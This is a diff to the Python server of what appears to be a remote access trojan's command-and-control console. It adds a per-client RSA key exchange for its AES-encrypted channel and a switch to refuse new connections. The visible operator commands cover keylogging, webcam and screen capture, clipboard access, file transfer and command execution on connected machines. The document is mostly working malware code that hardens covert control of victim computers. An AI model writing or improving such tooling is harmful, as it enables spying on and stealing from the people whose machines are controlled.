@@ -4,12 +4,15 @@ import base64
 import socket
 import json
 import threading
-import os
 import argparse
 import math
+import os
 # non-standard libraries
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.exceptions import InvalidTag
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import texttable
 import cmd2
 
@@ -231,9 +234,6 @@ class Connection:
 
         HOST = "127.0.0.1"
         PORT = 10001
-        KEY = b'\xbch`9\xd6k\xcbT\xed\xa5\xef_\x9d*\xda\xd2sER\xedA\xc0a\x1b)\xcc9\xb2\xe7\x91\xc2A'
-
-        self.crypter = AESGCM(KEY)
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -262,16 +262,37 @@ class Connection:
             except OSError:  # occurs when socket is closed
                 break
             else:
-                if address in self.blocked_ips:
+                if not self.user_interface.accept_new:
+                    connection.close()
+                elif address in self.blocked_ips:
                     connection.close()
                 else:
-                    self.user_interface.async_alert("[*] client connected")
-                    session = {"connection": connection,
-                               "address": address,
-                               "port": port,
-                               "tag": "no tag",
-                               "groups": {"all"}}
-                    self.sessions.append(session)
+                    aes_key = os.urandom(32)
+                    if self.exchange_keys(connection, aes_key):
+                        self.user_interface.async_alert("[*] client connected")
+                        session = {"connection": connection,
+                                   "address": address,
+                                   "port": port,
+                                   "tag": "no tag",
+                                   "groups": {"all"},
+                                   "crypter": AESGCM(aes_key)}
+                        self.sessions.append(session)
+
+    def exchange_keys(self, connection, aes_key):
+        try:
+            client_pubkey_pem = connection.recv(2048)
+            client_pubkey = serialization.load_pem_public_key(client_pubkey_pem, default_backend())
+            aes_key_enc = client_pubkey.encrypt(aes_key,
+                                                padding.OAEP(
+                                                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                                                    algorithm=hashes.SHA256(),
+                                                    label=None))
+            connection.sendall(aes_key_enc)
+            return True
+        except socket.error:
+            return False
+        except ValueError:
+            return False
 
     # credit: https://stackoverflow.com/questions/1094841/reusable-library-to-get-human-readable-version-of-file-size
     def format_byte_length(self, num, suffix='B'):
@@ -283,15 +304,16 @@ class Connection:
 
     def send(self, data: dict, connection):
         self.sock.settimeout(self.user_interface.sock_timeout)
-        data = self.encrypt(json.dumps(data).encode(self.CODEC))
+        data = self.encrypt(json.dumps(data).encode(self.CODEC), self.get_crypter_by_connection(connection))
         len_data_total = len(data)
         total_packets = math.ceil(len_data_total / self.PACKET_SIZE)
         try:
             connection.sendall(str(len_data_total).encode("utf8"))
             connection.recv(self.PACKET_SIZE)
             for packet_number in range(total_packets):
-                connection.sendall(data[packet_number*self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
-                sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} ({packet_number + 1 / (total_packets / 100)}% complete)")
+                connection.sendall(data[packet_number * self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
+                sys.stdout.write(
+                    f"\r[*] sending {self.format_byte_length(len_data_total)} ({packet_number + 1 / (total_packets / 100)}% complete)")
                 sys.stdout.flush()
                 print()
         except socket.error as error:
@@ -305,12 +327,13 @@ class Connection:
             connection.send("READY".encode("utf8"))
             for _ in range(math.ceil(header / self.PACKET_SIZE)):
                 data.extend(connection.recv(self.PACKET_SIZE))
-                sys.stdout.write(f"\r[*] receiving {self.format_byte_length(header)} ({round(len(data) / (header / 100), 1)}% complete)")
+                sys.stdout.write(
+                    f"\r[*] receiving {self.format_byte_length(header)} ({round(len(data) / (header / 100), 1)}% complete)")
                 sys.stdout.flush()
                 print()
-            received_dict = json.loads(self.decrypt(bytes(data)).decode(self.CODEC))
+            received_dict = json.loads(self.decrypt(bytes(data), self.get_crypter_by_connection(connection)).decode(self.CODEC))
 
-        # check the received data
+            # check the received data
             for expected_key, expected_type in zip(expected_dict.keys(), expected_dict.values()):
                 if expected_key not in received_dict.keys() or type(received_dict[expected_key]) != expected_type:
                     return False, None
@@ -327,17 +350,22 @@ class Connection:
             self.user_interface.perror(f"ValueError from session {self.get_index_by_connection(connection)}")
         return False, None
 
-    def encrypt(self, data):
+    def encrypt(self, data, crypter):
         nonce = os.urandom(12)
-        return nonce + self.crypter.encrypt(nonce, data, b"")
+        return nonce + crypter.encrypt(nonce, data, b"")
 
-    def decrypt(self, cipher):
-        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")
+    def decrypt(self, cipher, crypter):
+        return crypter.decrypt(cipher[:12], cipher[12:], b"")
 
     def get_index_by_connection(self, searched_connection):
         for index, session in enumerate(self.sessions):
             if searched_connection == session["connection"]:
                 return index
+
+    def get_crypter_by_connection(self, searched_connection):
+        for session in self.sessions:
+            if searched_connection == session["connection"]:
+                return session["crypter"]
 
 
 class UserInterface(cmd2.Cmd):
@@ -345,10 +373,6 @@ class UserInterface(cmd2.Cmd):
 
     list_parser = argparse.ArgumentParser(prog="list")
     list_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
-
-    opt_parser = argparse.ArgumentParser(prog="opt")
-    opt_parser.add_argument("-o", "--option", required=True, type=str, help="name of the option to edit")
-    opt_parser.add_argument("-v", "--value", required=True, type=int, help="value to change the option to")
 
     tag_parser = argparse.ArgumentParser(prog="tag")
     tag_parser.add_argument("-t", "--tag", required=True, type=str, help="value to change the tag to")
@@ -378,7 +402,7 @@ class UserInterface(cmd2.Cmd):
     up_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
 
     screen_parser = argparse.ArgumentParser(prog="screen")
-    screen_parser.add_argument("-m", "--monitor", default=-1, type=int, choices=range(-1, 99),
+    screen_parser.add_argument("-m", "--monitor", default=-1, type=int, choices=range(-1, 100),
                                help="monitor to capture (-1 for all)")
     screen_parser.add_argument("-w", "--write", required=True, type=str, help="file to write the picture in")
     screen_parser.add_argument("-s", "--sessions", nargs="+", required=True, help="sessions indices or groups")
@@ -400,7 +424,8 @@ class UserInterface(cmd2.Cmd):
     log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
     log_keys_parser = argparse.ArgumentParser(prog="clip")
-    log_keys_parser.add_argument("-c", "--content", default="", type=str, help="content to store to clipboard if provided")
+    log_keys_parser.add_argument("-c", "--content", default="", type=str,
+                                 help="content to store to clipboard if provided")
     log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
     block_parser = argparse.ArgumentParser(prog="block")
@@ -424,11 +449,15 @@ class UserInterface(cmd2.Cmd):
         self.cmd_timeout = 15
         self.zip_comp = 1
         self.sock_timeout = 20
+        self.accept_new = True
         # adding some settings
         self.add_settable(cmd2.Settable("cmd_timeout", int, "clientside timeout before returning from a command",
                                         choices=range(3600)))
-        self.add_settable(cmd2.Settable("zip_comp", int, "compression level when creating zip file", choices=range(10)))
-        self.add_settable(cmd2.Settable("sock_timeout", int, "serverside timeout for receiving and sending data", choices=range(3600)))
+        self.add_settable(cmd2.Settable("zip_comp", int, "compression level when creating zip file",
+                                        choices=range(1, 10)))
+        self.add_settable(cmd2.Settable("sock_timeout", int, "serverside timeout for receiving and sending data",
+                                        choices=range(3600)))
+        self.add_settable(cmd2.Settable("accept_new", bool, "accept new incoming connections"))
         # delete some builtins
         del cmd2.Cmd.do_py
         del cmd2.Cmd.do_run_pyscript
@@ -438,24 +467,19 @@ class UserInterface(cmd2.Cmd):
         del cmd2.Cmd.do_alias
         del cmd2.Cmd.do_macro
 
-    def poutput(self, msg='', *, end: str = '\n'):
+    def poutput(self, msg="", *, end: str = '\n'):
         super().poutput(msg)
 
-    def pinfo(self, msg=''):
+    def pinfo(self, msg=""):
         super().poutput(f"[*] {msg}")
 
-    def perror(self, msg='', *, end: str = '\n', apply_style: bool = True):
+    def perror(self, msg="", *, end: str = "\n", apply_style: bool = True):
         super().perror(f"[-] {msg}")
 
     @cmd2.decorators.with_argparser(list_parser)
     def do_list(self, args):
         """List connected sessions"""
         self.server.list_sessions(self.server.connection.get_conn_fgoi(args.sessions))
-
-    @cmd2.decorators.with_argparser(opt_parser)
-    def do_opt(self, args):
-        """Edit option value"""
-        self.server.set_option(args.option, args.value)
 
     @cmd2.decorators.with_argparser(exit_parser)
     def do_exit(self, _):
@@ -476,7 +500,8 @@ class UserInterface(cmd2.Cmd):
     @cmd2.decorators.with_argparser(group_parser)
     def do_group(self, args):
         """Edit sessions groups memberships"""
-        self.server.edit_group(self.server.connection.get_conn_fgoi(args.add), self.server.connection.get_conn_fgoi(args.rm), args.groups)
+        self.server.edit_group(self.server.connection.get_conn_fgoi(args.add),
+                               self.server.connection.get_conn_fgoi(args.rm), args.groups)
 
     @cmd2.decorators.with_argparser(exe_parser)
     def do_exe(self, args):
@@ -501,7 +526,8 @@ class UserInterface(cmd2.Cmd):
     @cmd2.decorators.with_argparser(zip_parser)
     def do_zip(self, args):
         """Compress to zip archive"""
-        self.server.zip_file_or_folder(args.compression_level, args.read, args.write, self.server.connection.get_conn_fgoi(args.sessions))
+        self.server.zip_file_or_folder(args.compression_level, args.read, args.write,
+                                       self.server.connection.get_conn_fgoi(args.sessions))
 
     @cmd2.decorators.with_argparser(cam_parser)
     def do_cam(self, args):
